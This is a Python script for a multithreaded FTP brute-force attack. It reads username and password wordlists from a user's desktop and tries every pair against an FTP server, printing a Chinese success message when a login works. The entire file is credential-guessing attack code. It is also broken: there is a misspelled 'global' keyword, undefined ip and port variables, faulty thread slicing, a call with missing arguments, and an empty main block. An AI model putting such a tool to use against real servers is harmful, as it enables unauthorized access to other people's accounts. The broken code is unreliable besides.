#! -*- coding:utf-8 -*-
import socket
import threading
import re
from ftplib import FTP
count=0
lock = threading.Lock()
def test(username,password,ip,port):
    global flag
    global ftp
    globel count
    global result
    for user in username:
        for passwd in password:
            if flag==True:
                return
            try:
                ftp = FTP()
                banner = ftp.connect(ip,port,timeout=2)
                ftp.login(user, passwd)
                ftp.quit()
                print('\n[+] 破解成功，用户名：%s 密码：%s\n' % (user, passwd))
                flag=True

                return
            except:
                pass
            lock.acquire()
            count+=1
            lock.release()


def ftp_brute(thread_num):
    global count
    with open(r'C:\Users\dkl\Desktop\plan.txt', 'r') as f:
        temp = f.readlines()
    username = [str.rstrip() for str in temp]

    with open(r'C:\Users\dkl\Desktop\1.txt', 'r') as f:
        temp = f.readlines()
    password = [str.rstrip() for str in temp]

    flag = False
    times = int(len(username) / thread_num)
    for i in range(thread_num):
        t1 = threading.Thread(target=test, args=(username[i:(i + 1) * times], password,ip,port))
        t1.start()
        t1.join()
    test(username[thread_num * times:], password)

if __name__ == '__main__':






